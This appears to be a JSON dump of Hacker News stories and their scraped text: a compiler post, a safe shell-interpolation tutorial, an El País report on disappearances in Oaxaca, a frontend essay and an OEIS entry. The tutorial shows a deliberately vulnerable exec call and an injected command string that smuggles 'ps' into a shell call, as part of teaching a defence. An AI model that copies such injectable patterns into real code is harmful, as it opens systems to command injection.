*[ctypes.POINTER(type(x)) for x in memrefs])\n\n# Execute compiled function\ncfunc = prototype(self._compiled_func)\ncfunc(*[ctypes.byref(x) for x in memrefs])\nNow to use our compiler to compile a function we can use the @kernel decorator on our own functions.\nimport llvmlite\nimport numpy as np\nllvmlite.opaque_pointers_enabled = True\n\nfrom mlir_egglog import kernel\n\n@kernel(\"float32(float32)\")\ndef fn(a):\n    return np.sin(a) * np.cos(a) + np.cos(a) * np.sin(a)\n\nout = fn(np.array([1.0], dtype=np.float32))\nprint(out)\nNow this is a very simple example compiler, the symbolic interpretation approach is fundamentaly limited because it can only handle flat functions with no control flow operations and requires us to manually specify the argument types, and only supports a limited set of operations. But it's a good starting point for seeing something that works end to end to use MLIR and e-graphs for optimization.\nExternal Resources\n\negglog: E-Graphs in Python\nEquality Saturation: A New Approach to Optimization\nE-graphs for Efficient Symbolic Compilation with Egglog\negglog Tutorial (EGRAPHS 2023) | Next Generation Egraphs\nDPopt: Differentiable Placement Optimization for Hardware Acceleration\nEquality Saturation for MLIR with Egglog\nGuided Equality Saturation\nSEER: Super-Optimization Explorer for High-Level Synthesis using E-graph Rewriting\nEquality Saturation\nSk Logic in Egglog (1)\nPEG: Combining Program Analysis with Dynamic Programming\nRelBench: A Unified Benchmark for Relational Learning\nEgraph-CHR\nDialEgg: Dialect-Agnostic MLIR Optimizer using Equality Saturation with Egglog\nEgglog Checkpoint\nFast and Extensible Equality Saturation with egg\nThe Theoretical Aspect of Equality Saturation (Part I)\nEquality Saturation: A New Approach to Optimization (YouTube)\nEquality Saturation: Term Extraction and an Application to Network Synthesis\nEgglog (for Equality Saturation) - Portland State Verification Seminar\nEnd-to-End Compilation with Equality Saturation\nEgglog (for Equality Saturation) - PLDI Presentation\nE-graphs and Automated Reasoning: Looking back to look forward",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "7a0fca0fc8e6db74",
    "title": {
      "en": "Safe Shell String Interpolation",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://samwing.dev/posts/zJonlrXabVoc",
    "score": 19,
    "by": "Wingy",
    "time": 1742665045,
    "content": "Safe Shell String Interpolation 2025-03-22  Let's take the toy problem of getting the user's name and printing out a rainbow greeting banner. An inexperienced developer might solve the problem like this:import { exec } from \"node:child_process\"\nimport { promisify } from \"node:util\"\nconst execPromise = promisify(exec)\n\nconst username = prompt(\"Hello, what's your name?\")\nconst banner = (await execPromise(`figlet \"Welcome, ${username}\" | lolcat -f`)).stdout // security vulnerability!\nconsole.log(banner)This works as you might expect:However, you might notice the bug when you run this with untrusted user input!The constructed command was:figlet \"Welcome, \"; ps; echo \"\" | lolcat -fThis kind of bug makes its way into production surprisingly often, although usually with trusted input. Even with trusted input, it can be a problem because you get strange bugs when your arguments contain spaces or something.The obvious solution is to use execFile rather than exec and pass the arguments directly to the command with no shells parsing user input. It looks like this:import { execFile } from \"node:child_process\"\nimport { promisify } from \"node:util\"\nconst execFilePromise = promisify(execFile)\n\nconst username = prompt(\"Hello, what's your name?\")\n// now we have to spawn the two processes and pipe the output of figlet into lolcat manually:\nconst lolcat = execFilePromise(\"lolcat\", [\"-f\"])\nconst figlet = execFile(\"figlet\", [`Welcome, ${username}`]).stdout.pipe(lolcat.child.stdin)\nconsole.log((await lolcat).stdout)I think this is a rather ugly solution. An alternative is to continue using shells, but pass the inputs in as environment variables:import { exec } from \"node:child_process\"\nimport { promisify } from \"node:util\"\nconst execPromise = promisify(exec)\n\nconst username = prompt(\"Hello, what's your name?\")\nconst banner = (await execPromise('figlet \"Welcome, $username\" | lolcat -f', { env: { ...process.env, username } })).stdout\nconsole.log(banner)We get the same, correct, result.In JavaScript, we can take this one step further! Tagged templates allow you to write functions that receive the arguments to a template literal and return whatever you want. Here's an example implementation of safe interpolation:import { exec as exec } from \"child_process\"\nimport { promisify } from \"util\"\nconst execPromise = promisify(exec)\n\nasync function shell(fragments: TemplateStringsArray, ...values: unknown[]) {\n  const env = { ...process.env }\n  const command = fragments.reduce((constructedCommand, fragment, i) => {\n    if (i < values.length) {\n      const varName = `_val${i + 1}`\n      env[varName] = `${values[i]}`\n      return constructedCommand + fragment + `$\\{${varName}}`\n    }\n    return constructedCommand + fragment\n  }, \"\")\n\n  return await execPromise(command, { env })\n}\n\nconst username = prompt(\"Hello, what's your name?\")\nconst banner = (await shell`figlet \"Welcome, ${username}\" | lolcat -f`).stdout\nconsole.log(banner)This allows you to safely do string interpolation with untrusted user input on shell commands! There are still plenty of footguns depending on the command you're using, like how the env command will start parsing out args if you start the first arg with -S . In general, be careful that the command you're passing untrusted user input to doesn't do unexpected things when given maliciously-crafted input.Now how about in other languages? In most cases, the best you can do is the environment variable method. Here's an example in Python:import subprocess\nimport os\n\ndef shell(command, **values):\n    return subprocess.run(\n        command,\n        shell=True,\n        check=True,\n        text=True,\n        capture_output=True,\n        env=os.environ | values,\n    )\n\nusername = input(\"Hello, what's your name? \")\nbanner = shell('figlet \"Welcome, $username\" | lolcat -f', username=username)\nprint(banner.stdout)There is a proposal, PEP 750, that would enable something like:shell(t'figlet \"Welcome, {username}\" | lolcat -f') It is expected to land in Python 3.14.Swift, however, is the only language other than JavaScript I have identified that has the equivalent feature today. It allows you to write structs extending ExpressibleByStringInterpolation in a similar fashion to JavaScript's tagged templates.I had not written a line of swift since I was eleven years old, and I didn't want to go learn Swift for a quick proof-of-concept, so this code is largely LLM-assisted.import Foundation\n\nstruct Shell: ExpressibleByStringInterpolation {\n    private var command: String\n    private var env: [String: String]\n    var result: String\n\n    struct Interpolation: StringInterpolationProtocol {\n        var command = \"\"\n        var env: [String: String] = [:]\n        private var argCount = 0\n\n        init(literalCapacity: Int, interpolationCount: Int) {}\n\n        mutating func appendLiteral(_ literal: String) {\n            command += literal\n        }\n\n        mutating func appendInterpolation(_ value: Any) {\n            argCount += 1\n            let varName = \"_val\\(argCount)\"\n            env[varName] = \"\\(value)\"\n            command += \"${\\(varName)}\"\n        }\n    }\n\n    init(stringLiteral value: String) {\n        command = value\n        env = [:]\n        // We can't use the run() function until all of our properties are initialized\n        // so we need to set result to \"\" first.\n        result = \"\"\n        // I'm not totally sure how this try? syntax works, the LLM generated it\n        // Presumably, it does run() and returns null if it fails, then we optional-chain to \"\" if it fails\n        result = (try? run()) ?? \"\"\n    }\n\n    init(stringInterpolation: Interpolation) {\n        command = stringInterpolation.command\n        env = stringInterpolation.env\n        result = \"\"\n        result = (try? run()) ?? \"\"\n    }\n\n    private func run() throws -> String {\n        let process = Process()\n        process.executableURL = URL(fileURLWithPath: \"/bin/sh\")\n        process.arguments = [\"-c\", command]\n\n        var environment = ProcessInfo.processInfo.environment\n        for (key, value) in env {\n            environment[key] = value\n        }\n        process.environment = environment\n\n        // Combining stdout and stderr is different\n        // than what I did in the Python and JS implementations.\n        // This function is purely LLM-generated (excluding this comment).\n        let pipe = Pipe()\n        process.standardOutput = pipe\n        process.standardError = pipe\n\n        try process.run()\n        process.waitUntilExit()\n\n        let data = pipe.fileHandleForReading.readDataToEndOfFile()\n        return String(data: data, encoding: .utf8) ?? \"\"\n    }\n}\n\nprint(\"What is your name?\", terminator: \" \")\nlet username = readLine()\n// Swift doesn't have single-quoted strings, so we need to escape the double quotes\n// in the figlet command.\nlet banner: Shell = \"figlet \\\"Welcome, \\(username!)\\\" | lolcat -f\"\nprint(banner.result)Appendix: Cursed Python VersionI wanted to see if it was possible to make shell(f'figlet \"Welcome, {username}\" | lolcat -f') not vulnerable to shell injection. Nobody should ever use this, but I managed to bludgeon it into doing what I wanted. It uses a decorator function that grabs the function's source code, manipulates it with regexes (I suppose you could use the AST for this, but editing code with regex makes the fun even more fun – nobody is putting this in production hopefully), and executes the newly updated code.import inspect\nimport os\nimport re\nimport subprocess\nimport uuid\n\ndef with_shell(f):\n    def wrapper(*args, **kwargs):\n        # Horrifying hack within a horrifying hack:\n        # Delete the first line of the function source code,\n        # which is the decorator itself.\n        # This is necessary to avoid infinite recursion.\n        # It will break if there's a decorator above this one.\n        function_source = \"\\n\".join(inspect.getsource(f).splitlines()[1::])\n        pattern = r'shell\\(f([\"\\']{1,3})(.*?)\\1\\)'\n        # We could replace all of the interpolated values with \"?\" or something,\n        # but what if the command itself contains a \"?\"?\n        # Instead, we generate an unpredictable placeholder.\n        placeholder = str(uuid.uuid4())\n\n        def replace_shell_invocation(match):\n            cmd = match.group(2)\n            placeholders = []\n\n            def replace_braces(match):\n                placeholders.append(match.group(1))\n                return placeholder\n\n            cmd_no_braces = re.sub(r\"\\{(.+?)\\}\", replace_braces, cmd)\n            placeholders_str = \", \".join(placeholders)\n            if placeholders_str:\n                return f'shell.internal({repr(cmd_no_braces)}, \"{placeholder}\", {placeholders_str})'\n            return f'shell.internal({repr(cmd_no_braces)}, \"{placeholder}\")'\n\n        new_code = re.sub(\n            pattern, replace_shell_invocation, function_source, flags=re.DOTALL\n        )\n        exec(compile(new_code, f.__code__.co_filename, \"exec\"), f.__globals__)\n        # We can't use f(*args, **kwargs) because it would call the original function,\n        # so we need to eval its name to get a reference to the newly-generated function\n        # from the exec.\n        eval(f.__name__)(*args, **kwargs)\n\n    return wrapper\n\ndef shell(command: str) -> str:\n    \"\"\"\n    Run a shell command and return the output. Prevents shell injection.\n\n    Args:\n        command: The shell command to run\n\n    Returns:\n        The output of the shell command\n    \"\"\"\n    raise NotImplementedError(\"Make sure you're using the with_shell decorator\")\n\ndef shell_internal(command, placeholder, *args):\n    i = 0\n    env = {}\n    while placeholder in command:\n        var_name = f\"_val{i}\"\n        env[var_name] = args[i]\n        command = command.replace(placeholder, f\"${{{var_name}}}\")\n        i += 1\n    return subprocess.run(\n        command,\n        shell=True,\n        check=True,\n        text=True,\n        capture_output=True,\n        env=os.environ | env,\n    )\n\nshell.internal = shell_internal\n\n@with_shell\ndef main():\n    username = input(\"Hello, what's your name? \")\n    banner = shell(f'figlet \"Welcome, {username}\" | lolcat -f')\n    print(banner.stdout)\n\nmain()",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "848c8869a89758eb",
    "title": {
      "en": "Horror on the coast of Oaxaca, a tourist paradise plagued by mass disappearances",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://english.elpais.com/international/2025-03-10/horror-on-the-coast-of-oaxaca-a-tourist-paradise-plagued-by-mass-disappearances.html",
    "score": 48,
    "by": "PaulHoule",
    "time": 1742666607,
    "content": "MEXICOHorror on the coast of Oaxaca, a tourist paradise plagued by mass disappearancesIn two months, 16 people have gone missing around Huatulco, Zipolite and Puerto Escondido, emblematic beaches of the Mexican Pacific. Nine bodies were found inside a car, but officials are giving no explanationsTourists at a bar in Mazunte, Oaxaca, Mexico, on March 8, 2025.Mónica González IslasBeatriz GuillénHuatulco (Mexico) - MAR 10, 2025 - 19:19 GMT+9Share on WhatsappShare on FacebookShare on TwitterShare on BlueskyShare on LinkedinCopy linkJaqueline Meza was taken from the paradisiacal beaches of Oaxaca a week ago. It was her mother who raised the alert: she was kidnapped while she was having dinner in a restaurant near the beach. Seven men disappeared from this same area in January. Another nine young men, at the end of February. Nothing has been heard of the first group. The bodies of the second group were found 250 miles away, in another state, inside an abandoned car. What happened in between remains a mystery, but the authorities have acknowledged that they are investigating possible involvement by the police. The crimes have shattered the idea of peace on this drop-dead gorgeous stretch of coastline. This holiday haven for artists, destination for two million tourists a year and a favorite spot for Instagram photos is now also the scene of brutal mass disappearances.Life goes on along the coast of Oaxaca, with the raging waves of the Pacific in the background. The usual routines go on at the beach: vendors offering massages, spicy peanuts, handmade earrings. In Zipolite, Mexico’s only official nudist beach, reggaeton and electronic music play in bars that are still running at low energy. These weeks represent a trough between the peaks of Christmas and Easter. But this year, in the interim, tragedy has struck. Between this town and Huatulco, 31 miles away, 10 people have gone missing. They were between 19 and 29 years old. Only one has been found alive.On February 28, Lesly Noya, 21, and Jaqueline Meza, 23, disappeared from Zipolite. So did Raúl González and his girlfriend Yamileth López, both 28. All of them were seen for the last time, according to their families, in this town of just 1,000 residents with a reputation for being bohemian and free. “Please, I ask for your help, my daughter disappeared last night, they took her and so far we know nothing,” pleaded Andrea Cazares, Jaqueline’s mother. This is how the message ended: “Two little ones, five and three years old, are waiting for her.”Some of the young people who went missing in Oaxaca: Rolando Evaristo, Rubén Antonio Ramos, Jacqueline Meza , Lesly Noya, Raúl Emmanuel González, Guillermo Cortes, Yamileth López and Angie Pérez.At about the same time, two other families were crying out in despair over their children’s fate in Huatulco, a paradise spot with nine bays that is considered one of the region’s jewels in the crown. The municipal police, they said, had taken Brenda Salas, 19, and Angie Pérez, 29. The agents had reportedly beaten them and taken them to another place, according to the request for help shared with journalists. Four more people went missing in the same approximate time period: Guillermo Cortés, Jonathan Uriel Calva, Marco Antonio Flores and Rolando Armando Evaristo, who were between 22 and 29 years old. It is not known where or when exactly they were taken.The 10 young people all came from Tlaxcala, in central Mexico, and lived in towns very close to one another (Apizaco, Santa Úrsula Zimatepec, Yauquemehcan). No one has confirmed whether they all knew each other before they were taken in Oaxaca. But what is certain is that their lives came together in the end. The bodies of nine of them were found inside a black Volkswagen, on the side of the highway that connects Oaxaca with Puebla. In a strange event that no authority has yet explained, the attackers left one survivor: Brenda Salas. It is more than a six-hour drive from where the youths were abducted to where their bodies were dropped off. How did the killers do it? Did they transport nine bodies for 250 miles or did they take them while they were still alive? If so, where were they killed? “How much power do you have to have to be able to drive across a state with a vehicle loaded with corpses? Or how much impunity?” asks a local journalist, who prefers not to give his name for security reasons.The bodies were placed exactly at the point where Oaxaca ends and the Mexican state of Puebla begins. The intention and effect of the transfer is not a coincidence: attention was diverted from the Oaxacan coast and also from its authorities. The bodies of the young people had not yet been returned to their families and Jesús Romero, Secretary of Government of Oaxaca, was already insisting to the press: “Huatulco is a safe destination for all families, for all Oaxacans, for all travelers, and there are all the conditions here to come and travel.”Tourists at a bar in Mazunte, Oaxaca, Mexico, on March 8, 2025.Mónica González IslasTourism is a driving force and a source of hope in this southern state, where 60% of the population lives in poverty (20%, almost 600,000 people, in extreme poverty). In Huatulco and Puerto Escondido alone, the two main attractions on this stretch of coast, 50,000 jobs depend on tourism. The economic impact left by visitors in 2024 exceeded 12.7 billion pesos (about $626 million), according to data from state tourism authorities.While tourists keep coming (including more and more foreigners), the governor of Oaxaca, Salomón Jara, from the political party Morena, recently boasted about the low crime rates. “It is the fifth state with the fewest crimes per 100,000 inhabitants,” the official boasted, deploying a narrative about effectiveness, meetings, team creation and coordination. This was on February 17, nine days before everything unraveled.The case has shocked the country, both because of its savagery and its strangeness. Oaxaca had so far stayed clear of the massacres that have devastated other areas of Mexico. There is no case here like that of the 43 missing students from Iguala (Guerrero), or that of the 72 migrants executed in San Fernando (Tamaulipas). In a country with 110,000 missing persons, only 746 went missing in this state, according to figures from the Ministry of the Interior. This registry, which lists people who have not been located since 1952, includes the seven people who disappeared in May 2024 in Puerto Escondido and seven more who vanished on their way to this town in early January. After them, there were the young people from Tlaxcala. That is to say: in less than a year, 25 people have vanished from these beaches, 16 of them in the last two months. The question comes back again and again: what is happening on the coast of Oaxaca?Aerial view of La Entrega beach in Huatulco, Oaxaca.Mónica González Islas“Zone of tolerance”This wild stretch of coastline is considered an arrival, storage and distribution zone for drugs en route to the rest of the country. Local residents talk about planes landing in the middle of the jungle and boats arriving at night with their shipments to the sand coves. Two weeks ago, the Navy seized a boat with more than 670 kilos of cocaine in Huatulco. How many make it through for every one that they catch? “It is a very important place for transit that until now had not recorded serious violent incidents,” says a reporter. Discretion is the best ally of drug trafficking.A businessman from the region describes it as “a zone of tolerance.” No one — neither the population nor the authorities — reports organized crime because the latter boast of “protecting and caring for” the area: they prohibit robberies and extortion, they do not approve of drugs such as crystal meth or the rape of women, they do not allow “excesses” because that scares away the tourists and disturbs business. This routine, which is neither new nor unique to the Oaxaca coast, allows criminal organizations to keep strengthening their tentacles: “It is like a power triad: drug dealers are businessmen, drug dealers are politicians, and drug dealers are drug dealers,” notes a local reporter.Aerial view of Santa Cruz Bay, Huatulco, Oaxaca, Mexico.Mónica González Islas11 murders in one weekendThe same day the boys disappeared, an environmental activist, Cristino Castro, was killed. He had spent his entire life defending his land, Barra de la Cruz, against the real estate developments that are fighting to turn this coast into the new Pacific Riviera, much as has already happened in Cancún, Playa del Carmen, Tulum, and even Acapulco. Also that weekend, a businessman from Huatulco, José Alfredo Lavariega, known as El Jocha, was found dead. His murder has been linked to the disappearance of the young men from Tlaxcala.Following the most recent disappearances, an old pattern has been repeated that was created by the government of Felipe Calderón in the so-called war on drugs: the criminalization of victims of forced disappearance. The justification is that if they were taken away, they were surely up to something: that if they were killed, they must have done something.A week after the kidnappings, there were no police or military personnel watching over Zipolite. Investigations into who and how the kidnappers were able to take 10 people are at a standstill. The official plan seems to be the same as always: wait until another tragedy takes place to draw attention away from what happened here. Meanwhile, the underground rivers continue to flow and the tourists keep coming, like an unconscious part of the scenery. They dance salsa and cumbia, they swim in the clean waters and walk naked on the sand, acting as if those who were taken were not, in reality, just like them.Sign up for our weekly newsletter to get more English-language news coverage from EL PAÍS USA EditionTu suscripción se está usando en otro dispositivo¿Quieres añadir otro usuario a tu suscripción?Añadir usuarioContinuar leyendo aquíSi continúas leyendo en este dispositivo, no se podrá leer en el otro.¿Por qué estás viendo esto?Flecha Tu suscripción se está usando en otro dispositivo y solo puedes acceder a EL PAÍS desde un dispositivo a la vez. Si quieres compartir tu cuenta, cambia tu suscripción a la modalidad Premium, así podrás añadir otro usuario. Cada uno accederá con su propia cuenta de email, lo que os permitirá personalizar vuestra experiencia en EL PAÍS.¿Tienes una suscripción de empresa? Accede aquí para contratar más cuentas.En el caso de no saber quién está usando tu cuenta, te recomendamos cambiar tu contraseña aquí.Si decides continuar compartiendo tu cuenta, este mensaje se mostrará en tu dispositivo y en el de la otra persona que está usando tu cuenta de forma indefinida, afectando a tu experiencia de lectura. Puedes consultar aquí los términos y condiciones de la suscripción digital.Sign up to EL PAÍS US Edition bulletinInternational El País in English on FacebookInternational El País in English on TwitterMore information‘El Mencho’ and ‘Don Rodo,’ a life of evading justice: From small-time dealers to heads of the most powerful cartel in MexicoAlejandro Santos Cid | MexicoDisappearance of eight young people and the silence of three states highlights opacity of crime in MexicoBeatriz Guillén | MexicoArchived InMexicoOaxacaClaudia SheinbaumFelipe CalderónAdheres toMore informationIf you are interested in licensing this content, click hereSponsored ContentGoogle Brain Co-Founder Andrew Ng, Recommends: Read These 5 Books And...Blinkist: Andrew Ng's Reading List|PatrocinadoPatrocinadoUndo특별한 의미를 담은 유니세프 팀 팔찌 받기유니세프|PatrocinadoPatrocinado지금 기부하기Undo100억 기부한 남자, 그의 충격적 정체는?한국재능나눔협회|PatrocinadoPatrocinado더 알아보기UndoAnd Also...The surprise success of ‘The White Lotus’ actress with imperfect teethEl PaísUndoReporter accidentally bumps microphone into President Trump's faceASUndoJD Vance and his wife booed upon arrival at Kenn edy CenterASUndo\n      window._taboola = window._taboola || [];\n      _taboola.push({mode:'thumbs-feed-01',container:'taboola-below-article-thumbnails',placement:'Below Article Thumbnails',target_type:'mix'});\n    Últimas noticias05:00Robert Merry, historian: ‘Trump doesn’t recognize McKinley’s remarkable turnaround with regard to his views on tariffs’05:00Why everything looks the same everywhere05:00From Pamela Anderson to Austin Butler: 10 sex symbols who earned critical acclaim05:00Bukele’s ‘miracle’ is Delmy’s nightmareMost viewedFrom glory to derision: 25 years of the concept album that ended The Smashing Pumpkins’ fame‘Mexican Auschwitz’ opens its doors: ‘The only truth is that they don’t care about the missing’Surviving failure, stereotypes, and Bill Murray: The return of Lucy Liu, the star who almost reigned in HollywoodBruce Willis at 70, the film legend whose memory is fading and who is supported by seven womenThe couple deported to Colombia after 35 years in the US",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "b244e987b5b3bb1d",
    "title": {
      "en": "Graydon Carter's Wild Ride Through the Golden Age of Magazines",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.newyorker.com/magazine/2025/03/24/when-the-going-was-good-graydon-carter-book-review",
    "score": 14,
    "by": "samclemens",
    "time": 1742440623,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d538177b8059be72",
    "title": {
      "en": "The Frontend Treadmill",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://polotek.net/posts/the-frontend-treadmill/",
    "score": 731,
    "by": "Kerrick",
    "time": 1742473531,
    "content": "The Frontend TreadmillA lot of frontend teams are very convinced that rewriting their frontend will lead to the promised land. And I am the bearer of bad tidings.If you are building a product that you hope has longevity, your frontend framework is the least interesting technical decision for you to make. And all of the time you spend arguing about it is wasted energy.I will die on this hill.If your product is still around in 5 years, you’re doing great and you should feel successful. But guess what? Whatever framework you choose will be obsolete in 5 years. That’s just how the frontend community has been operating, and I don’t expect it to change soon. Even the popular frameworks that are still around are completely different. Because change is the name of the game. So they’re gonna rewrite their shit too and just give it a new version number.Product teams that are smart are getting off the treadmill. Whatever framework you currently have, start investing in getting to know it deeply. Learn the tools until they are not an impediment to your progress. That’s the only option. Replacing it with a shiny new tool is a trap.I also wanna give a piece of candid advice to engineers who are searching for jobs. If you feel strongly about what framework you want to use, please make that a criteria for your job search. Please stop walking into teams and derailing everything by trying to convince them to switch from framework X to your framework of choice. It’s really annoying and tremendously costly.I always have to start with the cynical take. It’s just how I am. But I do want to talk about what I think should be happening instead.Companies that want to reduce the cost of their frontend tech becoming obsoleted so often should be looking to get back to fundamentals. Your teams should be working closer to the web platform with a lot less complex abstractions. We need to relearn what the web is capable of and go back to that.Let’s be clear, I’m not suggesting this is strictly better and the answer to all of your problems. I’m suggesting this as an intentional business tradeoff that I think provides more value and is less costly in the long run. I believe if you stick closer to core web technologies, you’ll be better able to hire capable engineers in the future without them convincing you they can’t do work without rewriting millions of lines of code.And if you’re an engineer, you will be able to retain much higher market value over time if you dig into and understand core web technologies. I was here before react, and I’ll be here after it dies. You may trade some job marketability today. But it does a lot more for career longevity than trying to learn every new thing that gets popular. And you see how quickly they discarded us when the market turned anyway. Knowing certain tech won’t save you from those realities.I couldn’t speak this candidly about this stuff when I held a management role. People can’t help but question my motivations and whatever agenda I may be pushing. Either that or I get into a lot of trouble with my internal team because they think I’m talking about them. But this is just what I’ve seen play out after doing this for 20+ years. And I feel like we need to be able to speak plainly.This has been brewing in my head for a long time. The frontend ecosystem is kind of broken right now. And it’s frustrating to me for a few different reasons. New developers are having an extremely hard time learning enough skills to be gainfully employed. They are drowning in this complex garbage and feeling really disheartened. As a result, companies are finding it more difficult to do basic hiring. The bar is so high just to get a regular dev job. And everybody loses.What’s even worse is that I believe a lot of this energy is wasted. People that are learning the current tech ecosystem are absolutely not learning web fundamentals. They are too abstracted away. And when the stack changes again, these folks are going to be at a serious disadvantage when they have to adapt away from what they learned. It’s a deep disservice to people’s professional careers, and it’s going to cause a lot of heartache later.On a more personal note, this is frustrating to me because I think it’s a big part of why we’re seeing the web stagnate so much. I still run into lots of devs who are creative and enthusiastic about building cool things. They just can’t. They are trying and failing because the tools being recommended to them are just not approachable enough. And at the same time, they’re being convinced that learning fundamentals is a waste of time because it’s so different from what everybody is talking about.I guess I want to close by stating my biases. I’m a web guy. I’ve been bullish on the web for 20+ years, and I will continue to be. I think it is an extremely capable and unique platform for delivering software. And it has only gotten better over time while retaining an incredible level of backwards compatibility. The underlying tools we have are dope now. But our current framework layer is working against the grain instead of embracing the platform.This is from a recent thread I wrote on mastodon. Reproduced with only light editing.2024-06-18https://polotek.net/posts/the-frontend-treadmill/\nMarco Rogers (polotek)",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "5cd2ca31ada68948",
    "title": {
      "en": "Powers of 2 with all even digits",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://oeis.org/A068994",
    "score": 263,
    "by": "Hbruz0",
    "time": 1742471713,
    "content": "OFFSET\n\n                                 1,1\n\n                         COMMENTS\n\n                                 Are there any more terms in this sequence?\n\n                                 Evidence that the sequence may be finite, from Rick L. Shepherd, Jun 23 2002:\n\n                                 1) The sequence of last two digits of 2^n, A000855 of period 20, makes clear that 2^n > 4 must have n == 3, 6, 10, 11, or 19 (mod 20) for 2^n to be a member of this sequence. Otherwise, either the tens digit (in 10 cases), as seen directly, or the hundreds digit, in the 5 cases receiving a carry from the previous power's tens digit >= 5, must be odd.\n\n                                 2) No additional term has been found for n up to 50000.\n\n                                 3) Furthermore, again for each n up to 50000, examining 2^n's digits leftward from the rightmost but only until an odd digit was found, it was only once necessary to search even to the 18th digit. This occurred for 2^12106 whose last digits are ...3833483966860466862424064. Note that 2^12106 has 3645 digits. (The clear runner-up, 2^34966, a 10526-digit number, required searching only to the 15th digit. Exponents for which only the 14th digit was reached were only 590, 3490, 8426, 16223, 27771, 48966 and 49519 - representing each congruence above.)\n\n                                 No additional terms up to 2^100000. - Harvey P. Dale, Dec 25 2012\n\n                                 No additional terms up to 2^(10^10). - Michael S. Branicky, Apr 16 2023\n\n                                 No additional terms up to 2^(10^11). See C program in links. It was only necessary to check the rightmost 40 digits of each power. But for going towards 10^12, 40 digits won't suffice. - Lukas Huwald, Mar 20 2025\n\n                                 No additional terms up to 2^(10^13). See second C program in links. The champions in this range are 2^133477987019 with 46 even last digits and 2^9780164740006 with 45 even last digits. - Fredrik Johansson, Mar 21 2025\n\n                         LINKS\n\n                                 Table of n, a(n) for n=1..5.\n\n                                 Lukas Huwald, C program to check powers of 2 for even digits\n\n                                 Fredrik Johansson, Second C program\n\n                                 Index to divisibility sequences\n\n                         MATHEMATICA\n\n                                 (*returns true if none of digits of n are odd, false o.w.*) f[n_] := Module[{ a, l, r, i}, a = IntegerDigits[n]; l = Length[a]; r = True; For[i = 1, i <= l, i++, If[Mod[a[[i]], 2] == 1, r = False; Break[ ]]]; r] (*main routine*) Do[p = 2^i; If[f[p], Print[p]], {i, 1, 10^4}]\n\n                                 Select[2^Range[0, 100], Union[Take[DigitCount[#], {1, -1, 2}]]=={0}&] (* Harvey P. Dale, Dec 25 2012 *)\n\n                                 Select[2^Range[0, 100], AllTrue[IntegerDigits[#], EvenQ]&] (* The program uses the AllTrue function from Mathematica version 10 *) (* Harvey P. Dale, Sep 18 2016 *)\n\n                         PROG\n\n                                 (PARI) f(n)=n=vecsort(eval(Vec(Str(n)))%2, , 8); #v==1&&v[1]==0\n\n                                 m=Mod(1, 10^19); for(n=1, 1e5, m*=2; if(f(lift(m))&&f(2^n), print1(2^n\", \"))) \\\\ Charles R Greathouse IV, Apr 09 2012\n\n                         CROSSREFS\n\n                                 Cf. A000855 (final two digits of 2^n), A096549.\n\n                                 Sequence in context: A065549 A067507 A320898 * A167182 A058345 A093843\n\n                                 Adjacent sequences:  A068991 A068992 A068993 * A068995 A068996 A068997\n\n                         KEYWORD\n\n                                 base,nonn,changed\n\n                         AUTHOR\n\n                                 Joseph L. Pe, Mar 14 2002\n\n                         STATUS\n\n                                 approved",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  }
]